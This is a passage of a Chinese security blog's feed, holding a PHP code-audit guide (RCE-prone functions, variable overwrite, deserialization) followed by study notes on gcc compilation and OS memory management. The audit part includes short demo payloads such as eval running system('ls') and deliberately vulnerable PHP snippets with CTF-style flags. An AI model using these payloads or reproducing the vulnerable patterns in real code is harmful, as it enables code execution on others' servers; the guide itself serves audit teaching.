title="三、根据功能点定向审计"></a>三、根据功能点定向审计</h2><p>根据经验我们简单介绍几个功能点会出现的漏洞：</p><ul><li><strong>文件上传功能</strong><br>这里说的文件上传在很多功能点都会出现，比如像<strong>文章编辑、资料编辑、头像上传、附件上传</strong>，这个功能最常见的漏洞就是任意文件上传了，后端程序没有严格地限制上传的格式，导致可以上传或者存在绕过的情况，而除了文件上传功能外，还经常发生SQL注入漏洞。</li></ul><ul><li><strong>文件管理功能</strong><br>在文件管理功能中，如果程序将文件名或者文件路径直接在参数中传递，则很有可能会存在任意文件的操作漏洞，比如任意文件读取等，利用的方法是在路径中使用../或者..\跳转目录。<br>除了任意文件操作漏洞外，还可能会存在XSS漏洞，程序会在页面中输出文件名，而通常会疏忽对文件名进行过滤，导致可以在数据库中存入带有尖括号等特殊符号的文件名，最后在页面显示的时候就会被执行。</li></ul><ul><li><strong>登录认证功能</strong><br>登录认证功能不是指一个过程，而是整个操作过程中的认证，目前的认证方式大多是基于Cookie和Session，不少程序会把当前登陆的用户账号等认证信息放到Cookie中，或许是加密方式。进行操作的时候直接从Cookie中读取当前用户信息，这里就存在一个算法可信的问题，如果这段Cookie信息没有加salt一类的东西，就可以导致任意用户登录漏洞，只要知道用户的不扥信息，即可生成认证令牌，甚至有的程序会直接把用户名放到Cookie中，操作的时候直接读取这个用户名的数据，这也是常说的越权漏洞。</li></ul><ul><li><strong>找回密码功能</strong><br>找回密码虽然看起来不像任意文件上传这种可以危害到服务器安全的漏洞，但是如果可以重置管理员的密码，也是可以间接控制业务权限甚至拿到服务权限的。找回密码功能的漏洞有很多利用场景，最常见的是验证码爆破。目前特别是APP应用，请求后端验证码的时候大多是4位，并且没有限制验证码的错误次数和有效时间，于是就出现了爆破的漏洞。</li></ul><p>下面再总结一下容易出现RCE的几个敏感点：</p><h2 id="四、PHP容易导致RCE的敏感函数"><a href="#四、PHP容易导致RCE的敏感函数" class="headerlink" title="四、PHP容易导致RCE的敏感函数"></a>四、PHP容易导致RCE的敏感函数</h2><p><strong>PHP代码执行函数</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>()</span><br><span class="line">assert()</span><br><span class="line">preg_replace()</span><br><span class="line">call_user_func()</span><br><span class="line">call_user_func_array()</span><br><span class="line">array_map()</span><br><span class="line">create_function()</span><br></pre></td></tr></table></figure><p>这些函数会将参数当做php代码或者php函数和参数进行执行,下面进行具体的利用解释：</p><ol><li><p><strong>eval (PHP 4, PHP 5, PHP 7)</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span> (string $code):mixed</span><br></pre></td></tr></table></figure><blockquote><p>作用：将参数字符串 $code 作为PHP代码执行</p></blockquote></li></ol><ol start="2"><li><p><strong>assert (PHP 4, PHP 5, PHP 7)</strong> </p><ul><li>PHP 5</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, string $description ] ) : bool</span><br></pre></td></tr></table></figure><ul><li>PHP 7</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, Throwable $exception ] ) : bool</span><br></pre></td></tr></table></figure><blockquote><p>作用：判断一个断言是否为FALSE。当传入的参数assertion是字符串时，它将会被assert()当做php代码执行。</p></blockquote></li></ol><ol start="3"><li><p><strong>preg_replace(PHP 4, PHP 5, PHP 7)</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])</span><br></pre></td></tr></table></figure><blockquote><p>作用： <strong>/e 修正符</strong>使 preg_replace() 将 replacement 参数当作 PHP 代码</p><p>PS： PHP 7.0.0 起，会产生 E_WARNING错误，同时 “\e” 也无法起效</p></blockquote></li></ol><ol start="4"><li><p><strong>call_user_func(PHP 4, PHP 5, PHP 7)</strong>   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) : mixed</span><br></pre></td></tr></table></figure><blockquote><p>作用： 第一个参数callback是被调用的<strong>回调函数</strong>，其余参数是回调函数的参数</p></blockquote></li></ol><ol start="5"><li><p><strong>call_user_func_array (PHP 4 &gt;= 4.0.4, PHP 5, PHP 7)</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array ( callable $callback , <span class="keyword">array</span> $param_arr ) : mixed</span><br></pre></td></tr></table></figure><blockquote><p>作用：把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入；</p></blockquote></li></ol><ol start="6"><li><p><strong>array_map (PHP 4 &gt;= 4.0.6, PHP 5, PHP 7)</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_map ( callable $callback , <span class="keyword">array</span> $array1 [, <span class="keyword">array</span> $... ] ) : <span class="keyword">array</span></span><br></pre></td></tr></table></figure><blockquote><p> 作用：即将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 </p></blockquote><blockquote><p>PS：回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致</p></blockquote></li></ol><ol start="7"><li><p><strong>create_function (PHP 4 &gt;= 4.0.1, PHP 5, PHP 7)</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function ( string $args , string $code ) : string</span><br></pre></td></tr></table></figure><blockquote><p>作用： 从传递的参数创建一个匿名函数，并返回一个唯一的名称</p><p>PS：该函数是会在内部执行eval，所以安全性和eval一致</p></blockquote></li></ol><p>常见的利用payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">"system('ls');"</span>);</span><br><span class="line"></span><br><span class="line">assert(<span class="string">'phpinfo()'</span>);</span><br><span class="line"></span><br><span class="line">preg_replace(<span class="string">"/&lt;php&gt;(.*?)&lt;\/php&gt;/e"</span>, <span class="string">'\1'</span>, <span class="string">"&lt;php&gt;phpinfo()&lt;/php&gt;"</span>);</span><br><span class="line"></span><br><span class="line">call_user_func(<span class="string">'assert'</span>,<span class="string">'phpinfo()'</span>);</span><br><span class="line"></span><br><span class="line">call_user_func_array(<span class="string">'assert'</span>,<span class="keyword">array</span>(<span class="string">'phpinfo()'</span>));</span><br><span class="line"></span><br><span class="line">array_map(<span class="string">'assert'</span>,<span class="keyword">array</span>(<span class="string">'phpinfo()'</span>));</span><br><span class="line"></span><br><span class="line">create_function(<span class="string">'$a'</span>, <span class="string">'assert($a);'</span>));</span><br></pre></td></tr></table></figure><h2 id="五、PHP中变量覆盖"><a href="#五、PHP中变量覆盖" class="headerlink" title="五、PHP中变量覆盖"></a>五、PHP中变量覆盖</h2><p><strong>1、全局变量覆盖</strong></p><p>当<strong>register_global=ON</strong>时，变量来源可能是各个不同的地方，比如页面的表单，Cookie等都可以,那么就可能产生变量覆盖：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Register_globals: "</span>.(int)ini_get(<span class="string">"register_globals"</span>).<span class="string">"&lt;br/&gt;"</span>;   </span><br><span class="line"><span class="keyword">if</span> ($shabi)&#123;  </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"you are not shabi!"</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们直接提交 shabi 参数即可覆盖到原有的变量$shabi /test.php?shabi=1</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you are not shabi!</span><br></pre></td></tr></table></figure><p><strong>2、$$导致的变量覆盖问题</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>,<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request)  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value)  </span><br><span class="line">    &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$id = <span class="keyword">isset</span>($id) ? $id : <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>($id == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"flag&#123;xxxxxxxxxx&#125;"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $id;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面是一个简单的例子，我们直接提交 id 参数，就能覆盖到原变量 $id。原因在于循环中在遍历到id参数时，会因为$$产生赋值操作：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>这样就导致了变量的覆盖</p><p><strong>3、extract()变量覆盖</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract ( <span class="keyword">array</span> &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = <span class="keyword">NULL</span> ]] ) : int</span><br></pre></td></tr></table></figure><blockquote><p>作用：从数组中将变量导入到当前的符号表</p></blockquote><p>在调用extract()时使用在flag选项使用EXTR_SKIP保证已有变量不会被覆盖 ，flag字段的可用选项：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXTR_OVERWRITE如果有冲突，覆盖已有的变量。</span><br><span class="line">EXTR_SKIP如果有冲突，不覆盖已有的变量。</span><br><span class="line">EXTR_PREFIX_SAME如果有冲突，在变量名前加上前缀 prefix。EXTR_PREFIX_ALL给所有变量名加上前缀 prefix。</span><br><span class="line">EXTR_PREFIX_INVALID仅在非法／数字的变量名前加上前缀 prefix。EXTR_IF_EXISTS仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。</span><br></pre></td></tr></table></figure><p><strong>4、parse_str()变量覆盖</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parse_str ( string $encoded_string [, <span class="keyword">array</span> &amp;$result ] ) : void</span><br></pre></td></tr></table></figure><blockquote><p>作用： 如果 encoded_string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ） </p></blockquote><blockquote><p>PS： 不赞同没有 result参数的情况下使用此函数，并且在 PHP 7.2 中将<em>废弃</em>不设置参数的行为。 </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$var=<span class="string">'shabi'</span>;  </span><br><span class="line">parse_str($_SERVER[<span class="string">'QUERY_STRING'</span>]);  </span><br><span class="line"><span class="keyword">print</span> $var;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面的代码很简单，就是定义一个 $var 变量，然后用parse_str来近些URL查询字符串，那我就可以通过查询 var 参数来覆盖到原来的 $var 变量，payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.php?<span class="keyword">var</span> = congming</span><br></pre></td></tr></table></figure><p><strong>5、import_request_variables变量覆盖</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(PHP <span class="number">4</span> &gt;= <span class="number">4.1</span><span class="number">.0</span>, PHP <span class="number">5</span> &lt; <span class="number">5.4</span><span class="number">.0</span>)  </span><br><span class="line">import_request_variables ( string $types [, string $prefix ] ) : bool</span><br></pre></td></tr></table></figure><blockquote><p>作用：将 GET／POST／Cookie 变量导入到全局作用域中</p></blockquote><blockquote><p>PS：第一个参数 types 指定需要导入的变量。可以用字母‘G’、‘P’和‘C’分别表示 GET、POST 和 Cookie。</p><p>这些字母不区分大小写，所以你可以使用‘g’、‘p’和‘c’的任何组合。POST 包含了通过 POST 方法上传的文件信息。</p><p>注意这些字母的顺序，当使用“gp”时，POST 变量将使用相同的名字覆盖 GET 变量。</p><p>任何 GPC 以外的字母都将被忽略。</p></blockquote><blockquote><p>PPS：第二个参数 prefix 作为变量名的前缀，置于所有被导入到全局作用域的变量之前。若没有指定第二个参数很容易导致变量覆盖。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">import_request_variables(<span class="string">"g"</span>);</span><br><span class="line"><span class="keyword">if</span>($radish==<span class="string">"radish"</span>)&#123;    </span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FIlE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为没有指定前缀，并且函数指定了可以通过GET方式进行全局导入，我们能轻易覆盖变量，提交payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.php?radish=radish</span><br></pre></td></tr></table></figure><h2 id="六、反序列化"><a href="#六、反序列化" class="headerlink" title="六、反序列化"></a>六、反序列化</h2><p><strong>1、基本概念：</strong></p><ul><li>序列化：把对象转换为字节序列的过程称为对象的序列化</li><li>反序列化：把字节序列恢复为对象的过程称为对象的反序列化</li></ul><p><strong>2、漏洞成因：</strong></p><p><strong>反序列化对象</strong>中存在<strong>魔术方法</strong>，而且魔术方法中的<strong>代码</strong>可以被控制，漏洞根据不同的代码可以导致各种攻击，如代码注入，sql注入，目录遍历等等 </p><p><strong>3、漏洞本质：</strong></p><p>unserialize函数的变量可控，php文件中存在可利用的类，类中有魔术方法 </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>关于反序列化的内容已经补齐，在“PHP反序列化”一篇中；关于代码审计具体关注点和关注函数在“代码审计关注点”中</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;代码审计思路&quot;&gt;&lt;a href=&quot;#代码审计思路&quot; class=&quot;headerlink&quot; title=&quot;代码审计思路&quot;&gt;&lt;/a&gt;代码审计思路&lt;/h1&gt;&lt;p&gt;面试的时候问到了关于代码审计的思路，这里就简单总结一下。&lt;/p&gt;
&lt;p&gt;常见的代码审计思路有以下四种：&lt;/p
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>程序员的自我修养-DAY2</title>
    <link href="http://bai-ren-1.github.io/2019/12/21/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY2/"/>
    <id>http://bai-ren-1.github.io/2019/12/21/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY2/</id>
    <published>2019-12-21T07:57:52.000Z</published>
    <updated>2019-12-21T08:36:58.625Z</updated>
    
    <content type="html"><![CDATA[<h1 id="程序员的自我修养-Day2"><a href="#程序员的自我修养-Day2" class="headerlink" title="程序员的自我修养 Day2"></a>程序员的自我修养 Day2</h1><p>上一篇文章是对操作系统和计组的一些基本概念进行了复习，这一篇主要是用来学习编译和链接的过程。</p><h2 id="gcc-编译过程"><a href="#gcc-编译过程" class="headerlink" title="gcc 编译过程"></a>gcc 编译过程</h2><p>我们在Linux下，对一个简单的hello.c的C文件使用命令gcc就能对其进行编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.c</span><br><span class="line">./a.out</span><br></pre></td></tr></table></figure><p>上面的命令就是用gcc编译生成a.out，然后执行了a.out。看似很简单一气呵成，但其实gcc的过程包括了4个步骤：</p><p><strong>预处理</strong>（Prepressing）-&gt; <strong>编译</strong>（Compilation）-&gt; <strong>汇编</strong>（Assembly）-&gt; <strong>链接</strong>（Linking）， 这个gcc编译过程入下图所示：</p><p><img src="/2019/12/21/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY2/gcc%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B.png" alt></p><p>我们下面分开讲解这四个步骤。</p><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><p>预编译相当于使用了下面这个命令（-E 参数代表只进行预编译）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -E hello.c -o hello.i （执行后输出hello.i文件）</span><br></pre></td></tr></table></figure><p>预编译过程是对源代码中#开始的预编译指令进行处理：</p><ul><li>删除所有的”#define”，展开所有的宏定义</li><li>处理所有的条件预编译指令，如”#if”、”#ifdef”、”#elif”、”#else”、”#endif”</li><li>处理”#include”预编译指令，将包含文件插入到该预编译指令的位置</li><li>删除注释 “//“、”/**/“</li><li>保留所有的#pragma编译器指令</li></ul><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>编译相当于使用了下面这个命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S hello.i -o hello.s  （执行后输出hello.s文件）</span><br></pre></td></tr></table></figure><p>对于C语言来说，执行预编译和编译的程序是cc1；对于C++来说，对应的程序叫做cc1plus；Objective-C则是cc1obj；Java则是jc1。所以<strong>gcc只是对这些后台程序的包装，它根据不同参数要求去调用不同的预编译编译程序cc1、汇编器as、链接器ld</strong>。</p><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><p>汇编相当于使用了下面这个命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -c hello.s -o hello.o  （执行后输出hello.s文件）</span><br><span class="line">或者直接调用汇编器</span><br><span class="line">as hello.s -o hello.o</span><br></pre></td></tr></table></figure><p>也可以直接一步到位，由C源码直接预编译、编译、汇编输出成<strong>目标文件</strong>（object file）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c hello.c -o hello.o</span><br></pre></td></tr></table></figure><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>如果通过调用链接器ld来执行，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ld -static crt1.o crti.o crtbeginT.o hello.o -start-group -lgcc -lgcc_eh -lc -end-group crtend.o crtn.o</span><br></pre></td></tr></table></figure><p>需要将上面这一大堆文件链接起来才可以得到最后的a.out可执行文件。这里的过程后面补上。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;程序员的自我修养-Day2&quot;&gt;&lt;a href=&quot;#程序员的自我修养-Day2&quot; class=&quot;headerlink&quot; title=&quot;程序员的自我修养 Day2&quot;&gt;&lt;/a&gt;程序员的自我修养 Day2&lt;/h1&gt;&lt;p&gt;上一篇文章是对操作系统和计组的一些基本概念进行了复习
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>程序员的自我修养-DAY1</title>
    <link href="http://bai-ren-1.github.io/2019/12/20/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY1/"/>
    <id>http://bai-ren-1.github.io/2019/12/20/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY1/</id>
    <published>2019-12-20T15:34:12.000Z</published>
    <updated>2019-12-24T02:38:06.832Z</updated>
    
    <content type="html"><![CDATA[<h1 id="程序员的自我修养-Day1"><a href="#程序员的自我修养-Day1" class="headerlink" title="程序员的自我修养 Day1"></a>程序员的自我修养 Day1</h1><p>静下心来好好研究计算机底层的实现，为二进制安全的研究做好铺垫。</p><h2 id="计算机体系结构"><a href="#计算机体系结构" class="headerlink" title="计算机体系结构"></a>计算机体系结构</h2><p>计算机的结构是一种由上而下组成的层结构，通过中间件进行访问：</p><p><img src="/2019/12/20/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY1/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84.png" alt></p><p>这其中每个层级之间的通信协议就称为 “<strong>接口</strong>“。下层是接口的提供者，上层是接口的使用者。每个中间层都是对它下层的包装和拓展。</p><p>从上图我们可以看出：</p><ul><li>应用程序和开发工具通过<strong>操作系统API</strong>（API：Application Programming Interface 应用程序编程接口）和运行库（不同的运行库提供不同的API，例如Linux下的Glibc提供POSIX的API等）进行交互；</li><li>运行库使用的是操作系统提供的<strong>系统调用接口</strong>（System Call Interface），在现实中常通过软件中断的方式提供（Linux系统用0x80号中断作为系统调用接口，而Window中通过0x2E号中断作为系统调用接口）；</li><li>操作系统内核层对于硬件接口来说是使用者，而硬件接口定义决定了操作系统内核。硬件和操作系统内核之间的接口常称为”<strong>硬件规格</strong>“（Hardware Specification）；</li></ul><p>这样我们就大致的了解了计算机不同层次之间的组织关系和联系方式。</p><h2 id="给进程分配内存"><a href="#给进程分配内存" class="headerlink" title="给进程分配内存"></a>给进程分配内存</h2><p>简单的直接分配地址策略会导致下面几个问题：（具体例子可以直接看书）</p><ul><li><p><strong>地址空间不隔离</strong>：因为所有程序都放在同一片内存空间中没有隔离，恶意程序或者BUG程序可能会很轻易地改写到其他程序的数据（Overflow的意思）</p></li><li><p><strong>内存使用效率低</strong>：因为地址空间连续，当前换出的程序的空间可能不够等待运行的程序的装入，造成空间的浪费。另一方面，程序运行中频繁的换入换出也会使得效率极低·</p></li><li><p><strong>程序运行的地址不确定</strong>：因为每次程序需要装入时，我们需要从内存中分配一段足够的空闲空间给它，而这个空闲空间的地址是不确定的。这就涉及到了重定位问题。</p></li></ul><p>既然直接分配内存明显是不行的，我们就可以引入一个中间件 “虚拟地址”，达到一种间接访问物理地址的方法。思路是这样的：使用<strong>某些映射方法来控制由虚拟地址到物理地址的映射</strong>过程。那么只要我们妥善控制了这个映射的方法，就能保证每一个程序之间的隔离效果。</p><h3 id="分段"><a href="#分段" class="headerlink" title="分段"></a>分段</h3><blockquote><p>首先附上汇编之前学过的知识：</p><p>十六进制0x串转为二进制 ：将每个位对应写成4位二进制形式</p></blockquote><p>贴上分段范例的示意图：</p><p><img src="/2019/12/20/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY1/%E5%88%86%E6%AE%B5.png" alt></p><p>上图使用的例子大概意思是： 现在有某个程序A，大小为10MB(计算：0xA00000 即是0xA个0x100000 。 其中的0x100000即是2^20个bit 即是1M。0xA个即是有10个1MB。那么就是程序A的大小为10MB)。它在虚拟地址中分配一段由0x00000000到0x00A00000的虚拟空间。 随后我们在物理地址空间里面的分配对应的相同大小的空间，假设这段空间由0x00100000到0x00B00000。<strong>虚拟空间里面的每个字节对应着物理空间里面的每个字节</strong>。那么当程序A里面访问到地址0x00001000的时候，CPU就会将这个地址转为真实的物理地址0x00101000。程序B也是同理。</p><p>假如当程序A访问虚拟地址超出了0x00A00000，就会被判断为非法访问并拒绝访问，这样就能避免程序覆盖了其他程序到导致错误。另一方面，程序不用关心它会被分配到真实物理空间的哪一区域，它只要按照自己程序的虚拟空间0x00000000到0x00A0000来编写程序和放置变量即可。</p><p>所以使用这种分段式方法基本解决了不隔离和地址不确定两个问题。我们得继续探讨如何处理效率低下的问题</p><h3 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h3><p>首先贴出分页的范例示意图：</p><p><img src="/2019/12/20/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY1/%E5%88%86%E9%A1%B5.png" alt></p><p>我们首先规定一些概念：</p><ul><li>虚拟空间的页叫做”<strong>虚拟页</strong>“（Virtual Page，简称VP）</li><li>物理内存的页叫做”<strong>物理页</strong>“ （Physical Page，简称PP）</li><li>磁盘中的页叫做”<strong>磁盘页</strong>“ （Disk Page，简称DP）</li></ul><p>然后我们对上图进行分析：</p><p>进程1中的虚拟页VP0、VP1和VP7映射到了物理页PP0、PP2和PP3上面；然后进程1中有部分虚拟页位于磁盘页中，即VP2、VP3分别位于磁盘中的DP0和DP1；进程1中剩下的虚拟页VP4-VP6可能因为还没调用或者被访问到，处于未访问的状态。</p><p>VP2、VP3没有位于物理内存中，当进程需要调用到VP2和VP3的时候，硬件就会捕捉到这个消息 ：”页错误”。然后<strong>操作系统就会接管进程</strong>负责从磁盘中将VP2和VP3读入到内存中，然后再将内存中的这两个PP和虚拟页中的VP2、VP3<strong>建立映射关系</strong>。</p><p>这样分页就达成了提高效率的目的</p><h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>线程的简单定义是：<strong>轻量级进程</strong>，线程是程序执行流程的最小单元。</p><p>线程具有三种基本状态：就绪 、运行 、等待</p><p>今天先写到这里吧。。。后面继续补上</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;程序员的自我修养-Day1&quot;&gt;&lt;a href=&quot;#程序员的自我修养-Day1&quot; class=&quot;headerlink&quot; title=&quot;程序员的自我修养 Day1&quot;&gt;&lt;/a&gt;程序员的自我修养 Day1&lt;/h1&gt;&lt;p&gt;静下心来好好研究计算机底层的实现，为二进制安全的研究
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Ret2Syscall</title>
    <link href="http://bai-ren-1.github.io/2019/12/06/Ret2Syscall/"/>
    <id>http://bai-ren-1.github.io/2019/12/06/Ret2Syscall/</id>
    <published>2019-12-06T08:23:27.000Z</published>
    <updated>2020-03-18T06:13:31.420Z</updated>
    
